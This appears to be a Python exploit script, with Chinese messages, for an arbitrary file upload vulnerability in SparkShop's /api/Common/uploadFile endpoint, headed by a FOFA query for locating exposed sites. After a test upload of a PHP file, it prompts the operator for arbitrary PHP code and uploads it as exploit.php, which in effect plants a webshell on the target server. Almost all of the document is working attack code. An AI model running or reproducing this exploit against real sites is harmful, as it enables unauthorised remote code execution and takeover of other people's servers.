#FOFA:"SparkShop"

import requests
import re
import argparse
import urllib3
import json

urllib3.disable_warnings()

proxy = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    try:
        headers = {
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR'
        }
        file_content = "<?php echo 'hello world'; ?>"
        data = (
            '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\n'
            'Content-Disposition: form-data; name="file"; filename="1.php"\r\n'
            '\r\n'
            f'{file_content}\r\n'
            '------WebKitFormBoundaryj7OlOPiiukkdktZR--'
        )

        res1 = requests.get(target,verify=False)
        if res1.status_code == 200:
            payload = "/api/Common/uploadFile"
            res2 = requests.post(target+payload,headers=headers,data=data,verify=False)
            res3 = json.loads(res2.text)
            if res2.status_code == 200 and res3['msg']=="upload success":
                data = res3['data']
                url = data['url']
                print(f"{target}存在文件上传漏洞\n上传地址{url}")
                exp(target)
            else:
                print(f"{target}不存在文件上传漏洞")
    except:
        print(target + ":不存在漏洞")


def exp(target):
    try:
        # 获取用户输入的 PHP 代码
        user_php_code = input("请输入要上传的PHP文件内容：")

        headers = {
            'Cache-Control': 'max-age=0',
            'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"macOS"',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR'
        }

        data = (
            '------WebKitFormBoundaryj7OlOPiiukkdktZR\r\n'
            'Content-Disposition: form-data; name="file"; filename="exploit.php"\r\n'
            '\r\n'
            f'{user_php_code}\r\n'
            '------WebKitFormBoundaryj7OlOPiiukkdktZR--'
        )

        payload = "/api/Common/uploadFile"
        res = requests.post(target + payload, headers=headers, data=data, verify=False)
        res_json = json.loads(res.text)

        if res.status_code == 200 and res_json['msg'] == "upload success":
            data = res_json['data']
            url = data['url']
            print(f"上传成功！PHP文件地址：{url}")
        else:
            print("文件上传失败")
    except Exception as e:
        print(f"操作失败-{str(e)}")

def main():
    parser = argparse.ArgumentParser("南京星源图科技任意文件上传漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()